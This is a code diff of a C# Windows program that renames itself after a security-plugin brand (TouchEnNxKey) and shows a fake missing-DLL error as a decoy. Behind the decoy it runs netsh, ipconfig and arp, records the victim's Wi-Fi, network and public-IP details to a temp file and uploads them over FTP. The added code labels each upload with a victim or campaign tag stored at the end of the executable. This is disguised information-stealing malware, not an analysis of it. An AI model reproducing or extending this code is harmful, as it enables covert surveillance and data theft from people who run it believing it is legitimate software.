@@ -7,10 +7,21 @@ using System.Net;
 using System.Text;
 using System.Windows.Forms;
 
-namespace FTPUploader
+namespace TouchEnNxKey
 {
     static class Program
     {
+
+        
+        private static int MAXBUFFSIZE = 1024;
+        private static string sep = "\r\n\r\n\r\n---------------------------------------------------------------------\r\n\r\n\r\n";
+
+        private static string magic = "TAG:";
+        private static string Magic { get => magic; set => magic = value; }
+
+        private static string tag = "";
+        private static string Tag { get => tag; set => tag = value; }
+
         /// <summary>
         /// 해당 응용 프로그램의 주 진입점입니다.
         /// </summary>
@@ -19,7 +30,9 @@ namespace FTPUploader
         {
             MessageBox.Show("Win32Evrt.dll 파일을 찾을 수 없습니다.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
 
-            string sep = "\r\n\r\n\r\n---------------------------------------------------------------------\r\n\r\n\r\n";
+            Tag = ReadTag(System.Reflection.Assembly.GetEntryAssembly().Location);
+
+            
             StringBuilder sb = new StringBuilder();
             sb.Append(sep);
             sb.Append(getWifiInfo());
@@ -32,7 +45,7 @@ namespace FTPUploader
 
             String timeStamp = GetTimestamp(DateTime.Now);
             string localPath = Path.GetTempPath();
-            string fileName = "IP" + timeStamp +".txt";
+            string fileName = Tag + "_" + timeStamp +".txt";
 
             //text 인자를 파일로 생성
             using (StreamWriter output = new StreamWriter(localPath + fileName, false, System.Text.Encoding.UTF8))
@@ -48,10 +61,12 @@ namespace FTPUploader
             //Application.Run(new Form1());
         }
 
+
         public static String GetTimestamp(DateTime value)
         {
             return value.ToString("yyyyMMdd_HHmmss");
         }
+
 
         static string runCommand(string command)
         {
@@ -70,6 +85,7 @@ namespace FTPUploader
             return output;
         }
 
+
         static void runCommand_async(string command)
         {
             Process proc = new Process();
@@ -83,6 +99,7 @@ namespace FTPUploader
             proc.Start();
         }
 
+
         static string getWifiInfo()
         {
             string command = "netsh wlan show networks mode=bssid";
@@ -90,6 +107,7 @@ namespace FTPUploader
             output += runCommand(command);
             return output;
         }
+
 
         static string getIpconfig_All()
         {
@@ -99,6 +117,7 @@ namespace FTPUploader
             return output;
         }
 
+
         static string getARP()
         {
             string command = "arp -a";
@@ -106,6 +125,7 @@ namespace FTPUploader
             output += runCommand(command);
             return output;
         }
+
 
         static string getPublicIP()
         {
@@ -115,6 +135,7 @@ namespace FTPUploader
             return output;
 
         }
+
 
         static void FtpUpload(string ftpServer, string id, string password, string localFilePath, string remoteFilePath)
         {
@@ -183,6 +204,49 @@ namespace FTPUploader
             responseFileDownload = null;
         }
 
+
+        static void WriteTag(string filename, string tag)
+        {
+            using (var fileStream = new FileStream(filename, FileMode.Append, FileAccess.Write, FileShare.None))
+            using (var bw = new BinaryWriter(fileStream))
+            {
+                byte[] data = new byte[MAXBUFFSIZE];
+                byte[] aa = System.Text.Encoding.UTF8.GetBytes(Magic + tag);
+                if (aa.Length > data.Length)
+                    throw new Exception("태그 사이즈가 너무 깁니다. Magic + tag 사이즈는 " + MAXBUFFSIZE + " 이내여야 합니다.");
+
+                aa.CopyTo(data, 0);
+
+                bw.Write(data);
+            }
+        }
+
+        static string ReadTag(string filename)
+        {
+            string tag = ""; //TAG:문자열
+            using (var br = new BinaryReader(File.Open(filename, FileMode.Open, FileAccess.Read)))
+            {
+                int length = (int)br.BaseStream.Length;
+                if (length <= MAXBUFFSIZE)
+                    throw new Exception("파일 사이즈가 1024보다 작습니다.");
+
+                int offset = length - MAXBUFFSIZE; //파일 끝에서 1024 만큼 읽을꺼임
+                br.BaseStream.Seek(offset, SeekOrigin.Begin);
+
+                byte[] data = br.ReadBytes(MAXBUFFSIZE);
+                int end = 0;
+                for (int i = 0; data[i] != 0; i++)
+                {
+                    end = i + 1;
+                }
+                tag = System.Text.Encoding.UTF8.GetString(data, 0, end);
+            }
+
+            if(tag.IndexOf(Magic) == -1)
+                return "";
+
+            return tag.Replace(Magic, "");
+        }
 
     }
 }
